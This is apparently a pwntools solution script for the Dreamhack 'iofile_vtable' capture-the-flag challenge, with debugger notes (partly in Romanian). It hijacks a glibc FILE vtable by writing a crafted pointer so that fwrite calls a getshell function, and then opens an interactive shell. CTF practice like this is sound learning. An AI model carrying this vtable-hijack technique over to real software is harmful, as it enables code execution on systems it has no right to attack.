from pwn import *
elf =  ELF("./iofile_vtable")
#libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:16916'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#x/5gx 0x6010C0
#0x6010c0 <stderr@@GLIBC_2.2.5>: 0x00007ffff7f924e0

#0x7ffff7f924e0 is stderr -> _IO_list_all atm
#vtable is after the *file structure
#we write at stderr +1 -> exactly inside its vtable
#question is, what function is going to get called from vtable.

getshell = 0x40094a
name = 0x6010D0
#gdb.attach(p)

p.recvuntil(b": ")
p.send(p64(getshell))

p.recvuntil(b"> ")
p.sendline(b"4")

p.send(p64(name-56))

p.recvuntil(b"> ")
p.sendline(b"2")

#i set a bp inside the fwrite
#also that does vtable ->_IO_FILE_xsputn
#0x7ffff7f90060 <_IO_file_jumps+48>:     0x00007ffff7e3a5e0      0x00007ffff7e379c0
#0x7ffff7e379c0 <_IO_new_file_xsputn>:   0x417974d28548c031 

#face call [addr + 0x38]
#adica ce e acolo inauntru
#de aia ni se da name?
#dam name - 0x38, si in name punem p64(getshell)

p.interactive()
